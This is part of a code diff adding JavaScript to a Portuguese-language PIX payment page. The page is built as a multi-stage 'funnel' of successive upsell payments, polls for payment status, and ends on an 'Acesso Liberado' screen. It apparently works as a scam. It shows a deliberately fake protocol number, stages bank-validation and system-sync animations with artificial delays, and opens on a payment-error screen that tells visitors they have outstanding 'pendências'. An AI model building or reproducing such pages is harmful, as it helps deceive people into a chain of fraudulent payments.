+             document.body.removeChild(textArea);
+        }
+
+        function dispararFeedbackCopia() {
+            const btn = document.getElementById('btn-copiar');
+            const originalHtml = btn.innerHTML;
+            btn.innerHTML = `<i data-lucide="check" class="w-5 h-5 text-emerald-400 scale-125 transition-transform"></i> CÓDIGO COPIADO!`;
+            btn.classList.remove('bg-brandDark', 'hover:bg-[#1A2C45]');
+            btn.classList.add('bg-emerald-600', 'pointer-events-none');
+            lucide.createIcons();
+            showToast("Código PIX copiado para a área de transferência!", "success");
+            setTimeout(() => {
+                btn.innerHTML = originalHtml;
+                btn.classList.remove('bg-emerald-600', 'pointer-events-none');
+                btn.classList.add('bg-brandDark', 'hover:bg-[#1A2C45]');
+                lucide.createIcons();
+            }, 3500);
+        }
+
+        async function checarStatusPagamento(txId) {
+            if (!txId) return false;
+            try {
+                const res = await fetch(`${PIX_API_BASE}/api/pix/status?id=${encodeURIComponent(txId)}`);
+                if (!res.ok) return false;
+                const data = await res.json();
+                return data.status === 'approved';
+            } catch(e) {
+                return false;
+            }
+        }
+
+        function iniciarPollingPagamento(txId, cenarioId) {
+            if(pollingInterval) clearInterval(pollingInterval);
+            let tentativas = 0;
+            pollingInterval = setInterval(async () => {
+                tentativas++;
+                const isPaid = await checarStatusPagamento(txId);
+                if(isPaid) {
+                    clearInterval(pollingInterval);
+                    localStorage.removeItem('pix_pending_upsell-' + cenarioId);
+                    showToast("Pagamento confirmado! Processando...", "success");
+                    avancarCenario(cenarioId);
+                }
+                if(tentativas > 40) clearInterval(pollingInterval);
+            }, 3000);
+        }
+
+        async function verificarPagamentoManual(cenarioId) {
+            const btn = document.getElementById('btn-verificar');
+            const originalHtml = btn.innerHTML;
+            
+            btn.innerHTML = `<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i> Validando com o Banco...`;
+            btn.classList.add('opacity-90', 'pointer-events-none');
+            lucide.createIcons();
+            
+            await new Promise(r => setTimeout(r, 1500));
+
+            const isPaid = await checarStatusPagamento(currentTxId);
+            
+            if(isPaid) {
+                if(pollingInterval) clearInterval(pollingInterval);
+                localStorage.removeItem('pix_pending_upsell-' + cenarioId);
+                showToast("Confirmação recebida com sucesso!", "success");
+                avancarCenario(cenarioId);
+            } else {
+                showToast("Ainda não identificamos seu pagamento. Aguarde alguns segundos e tente novamente.", "error");
+                btn.innerHTML = originalHtml;
+                btn.classList.remove('opacity-90', 'pointer-events-none');
+                lucide.createIcons();
+            }
+        }
+
+        function avancarCenario(cenarioId) {
+            const data = FUNIL[cenarioId];
+            if(data.proximoCenario === 'sucesso') telaSucessoAbsoluto();
+            else telaCarregamentoIntermediaria(data.proximoCenario);
+        }
+
+        function telaCarregamentoIntermediaria(proximoCenario) {
+            const contentDiv = document.getElementById('app-content');
+            contentDiv.classList.remove('p-6');
+            
+            contentDiv.innerHTML = `
+                <div class="flex-1 flex flex-col items-center justify-center text-center fade-in p-10 relative overflow-hidden">
+                    <div class="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(16,185,129,0.05)_0%,transparent_70%)]"></div>
+                    <div class="relative mb-8">
+                        <div class="absolute inset-0 bg-emerald-100 rounded-full animate-ping opacity-50"></div>
+                        <div class="w-20 h-20 bg-emerald-50 border-[3px] border-emerald-400 rounded-full flex items-center justify-center shadow-sm relative z-10">
+                            <i data-lucide="check-big" class="w-10 h-10 text-emerald-600 animate-[scale-in_0.3s_ease-out]"></i>
+                        </div>
+                    </div>
+                    <h3 class="text-xl font-black text-gray-900 mb-2 tracking-tight">Pagamento Reconhecido!</h3>
+                    <p class="text-gray-600 font-medium text-[15px] mb-8 leading-relaxed">Aguarde enquanto autenticamos a transação nos servidores...</p>
+                    <div class="w-full max-w-[240px] bg-gray-100 rounded-full h-2 overflow-hidden relative shadow-inner">
+                        <div class="absolute top-0 left-0 h-full bg-gradient-to-r from-emerald-400 to-brandDark animate-[progress-indet_1.5s_ease-in-out_infinite]" style="width: 50%;"></div>
+                    </div>
+                    <p id="system-log" class="text-[12px] text-gray-400 font-mono mt-5 uppercase tracking-widest font-bold flex items-center gap-2">
+                        <i data-lucide="cpu" class="w-4 h-4 animate-spin-slow"></i> Sincronizando Sistema...
+                    </p>
+                </div>
+            `;
+            lucide.createIcons();
+
+            setTimeout(() => {
+                const log = document.getElementById('system-log');
+                if(log) {
+                    log.innerHTML = `<i data-lucide="search-check" class="w-4 h-4 text-amber-500"></i> Identificando Próxima Etapa...`;
+                    log.classList.replace('text-gray-400', 'text-amber-600');
+                    lucide.createIcons();
+                }
+            }, 2500);
+
+            setTimeout(() => {
+                try { window.history.replaceState({}, '', '?step=' + proximoCenario); } catch(e) { }
+                contentDiv.classList.add('p-6');
+                renderizarTela(proximoCenario);
+            }, 5000);
+        }
+
+        function telaSucessoAbsoluto() {
+            const contentDiv = document.getElementById('app-content');
+            contentDiv.classList.remove('p-6');
+
+            contentDiv.innerHTML = `
+                <div class="flex-1 flex flex-col items-center justify-center text-center fade-in p-8 relative overflow-hidden">
+                     <div class="absolute inset-0 bg-[radial-gradient(circle_at_top,rgba(16,185,129,0.1)_0%,transparent_60%)]"></div>
+                     <div class="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-emerald-400 via-emerald-500 to-emerald-400"></div>
+
+                    <div class="mb-6 relative">
+                        <div class="absolute inset-0 bg-emerald-100/50 rounded-full animate-[ping_2s_cubic-bezier(0,0,0.2,1)_infinite]"></div>
+                        <div class="w-24 h-24 bg-gradient-to-br from-emerald-50 to-white border-4 border-emerald-500 rounded-full flex items-center justify-center shadow-xl relative z-10">
+                            <i data-lucide="unlock-keyhole" class="w-12 h-12 text-emerald-600 drop-shadow-sm"></i>
+                        </div>
+                    </div>
+                    
+                    <h2 class="text-[28px] font-black text-gray-900 uppercase tracking-tighter mb-3 leading-none">Acesso Liberado</h2>
+                    <p class="text-gray-600 text-[16px] font-medium leading-relaxed mb-10 px-4 max-w-sm mx-auto">Parabéns! Todas as pendências foram regularizadas com sucesso.</p>
+                    
+                    <div class="w-full bg-white border border-gray-100 rounded-3xl p-6 text-left shadow-xl relative overflow-hidden">
+                        <div class="absolute top-0 right-0 p-4 opacity-5"><i data-lucide="shield-check" class="w-32 h-32 text-emerald-900"></i></div>
+                        <div class="flex items-center gap-3 mb-6 pb-4 border-b border-gray-100 relative z-10">
+                            <div class="p-2 bg-emerald-100 rounded-full">
+                                <i data-lucide="check-circle-2" class="w-6 h-6 text-emerald-600"></i>
+                            </div>
+                            <span class="text-[14px] font-bold text-gray-900 uppercase tracking-wide">Status: 100% Regularizado</span>
+                        </div>
+                        <div class="font-mono text-[13px] text-gray-500 space-y-3 relative z-10 mb-6 pl-2">
+                            <p class="flex items-center justify-between"><strong class="text-gray-700 uppercase tracking-wider font-sans text-[11px]">Protocolo:</strong> <span>${protocoloFake}</span></p>
+                            <p class="flex items-center justify-between"><strong class="text-gray-700 uppercase tracking-wider font-sans text-[11px]">Data Base:</strong> <span>${dataHoje}</span></p>
+                        </div>
+                        <div class="bg-brandDark rounded-2xl p-5 text-center shadow-md relative overflow-hidden z-10">
+                             <div class="absolute inset-0 bg-[linear-gradient(45deg,transparent_25%,rgba(255,255,255,0.05)_50%,transparent_75%,transparent_100%)] bg-[length:250%_250%,100%_100%] animate-[shimmer_3s_linear_infinite]"></div>
+                            <p class="text-[14px] font-bold text-white tracking-wide flex items-center justify-center gap-2">
+                                <i data-lucide="mail-check" class="w-5 h-5 text-emerald-400"></i>
+                                Material enviado para seu e-mail.
+                            </p>
+                        </div>
+                    </div>
+                    <p class="text-[11px] text-gray-400 font-medium mt-8">Pode fechar esta janela com segurança.</p>
+                </div>
+            `;
+            lucide.createIcons();
+        }
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const stepToLoad = urlParams.get('step');
+
+        const style = document.createElement('style');
+        style.innerHTML = `
+            @keyframes progress-indet { 0% { left: -50%; } 100% { left: 100%; } }
+            @keyframes scale-in { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+            @keyframes spin-slow { to { transform: rotate(360deg); } }
+            @keyframes shimmer { 0% { background-position: -200% 0, 0 0; } 100% { background-position: 200% 0, 0 0; } }
+        `;
+        document.head.appendChild(style);
+
+        if (stepToLoad === 'sucesso') {
+            telaSucessoAbsoluto();
+        } else if (stepToLoad && FUNIL[stepToLoad]) {
+            telaCarregamentoIntermediaria(stepToLoad);
+        } else {
+             document.getElementById('app-content').classList.add('p-6');
+            renderizarTela('erro_pagamento');
+        }
+    </script>
+</body>
+</html>
